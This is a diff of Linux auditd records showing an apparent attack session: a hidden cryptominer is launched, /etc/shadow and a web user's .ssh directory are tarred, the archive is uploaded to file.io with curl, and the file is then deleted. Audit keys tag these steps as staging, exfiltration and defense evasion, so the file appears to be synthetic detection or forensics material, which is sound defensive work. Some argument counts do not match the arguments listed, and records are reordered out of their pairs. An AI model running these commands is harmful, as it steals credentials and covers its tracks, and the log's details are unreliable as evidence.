@@ -1,5 +1,11 @@
-type=SYSCALL msg=audit(1715426112.441:521): arch=c000003e syscall=59 success=yes exit=0 a0=558ed2718e80 a1=558ed2720fb0 a2=558ed26e95b0 a3=7ffe6e788640 items=2 ppid=1455 pid=1588 auid=1001 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=2 comm="sh" exe="/usr/bin/dash" key="susp_exec"
 type=EXECVE msg=audit(1715426112.441:521): argc=3 a0="sh" a1="-c" a2="./.hidden_miner -o pool.monero.org:443"
+type=EXECVE msg=audit(1715438510.111:612): argc=4 a0="tar" a1="-czvf" a2="/tmp/.cache_bak.tar.gz" a3="/etc/shadow" a4="/home/webapp/.ssh/"
+type=EXECVE msg=audit(1715438545.222:613): argc=5 a0="curl" a1="-F" a2="file=@/tmp/.cache_bak.tar.gz" a3="https://file.io"
+type=EXECVE msg=audit(1715438550.333:614): argc=2 a0="rm" a1="/tmp/.cache_bak.tar.gz"
 type=PATH msg=audit(1715426112.441:521): item=0 name="/tmp/.hidden_miner" inode=131074 dev=08:01 mode=0100755 ouid=1001 ogid=1001
-type=SYSCALL msg=audit(1715426180.123:522): arch=c000003e syscall=2 success=yes exit=3 a0=7ffe6e788b90 a1=2 a2=1b6 a3=24 items=1 ppid=1588 pid=1602 auid=1001 uid=0 gid=0 comm="vi" exe="/usr/bin/vim.basic" key="identity"
 type=PATH msg=audit(1715426180.123:522): item=0 name="/etc/shadow" inode=135 dev=08:01 mode=0100640 ouid=0 ogid=42
+type=SYSCALL msg=audit(1715426112.441:521): arch=c000003e syscall=59 success=yes exit=0 a0=558ed2718e80 a1=558ed2720fb0 a2=558ed26e95b0 a3=7ffe6e788640 items=2 ppid=1455 pid=1588 auid=1001 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=2 comm="sh" exe="/usr/bin/dash" key="susp_exec"
+type=SYSCALL msg=audit(1715426180.123:522): arch=c000003e syscall=2 success=yes exit=3 a0=7ffe6e788b90 a1=2 a2=1b6 a3=24 items=1 ppid=1588 pid=1602 auid=1001 uid=0 gid=0 comm="vi" exe="/usr/bin/vim.basic" key="identity"
+type=SYSCALL msg=audit(1715438510.111:612): arch=c000003e syscall=59 success=yes exit=0 a0=7ffed1a2b3c0 a1=7ffed1a2b4d0 a2=7ffed1a2b5e0 items=2 ppid=2102 pid=4811 auid=1001 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=2 comm="tar" exe="/usr/bin/tar" key="data_staging"
+type=SYSCALL msg=audit(1715438545.222:613): arch=c000003e syscall=59 success=yes exit=0 a0=7ffed1a2b8f0 a1=7ffed1a2b9a0 a2=7ffed1a2ba10 items=2 ppid=2102 pid=4815 auid=1001 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=2 comm="curl" exe="/usr/bin/curl" key="exfiltration_network"
+type=SYSCALL msg=audit(1715438550.333:614): arch=c000003e syscall=263 success=yes exit=0 a0=AT_FDCWD a1=7ffed1a2bc30 a2=0 items=1 ppid=2102 pid=4816 auid=1001 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=2 comm="rm" exe="/usr/bin/rm" key="defense_evasion"
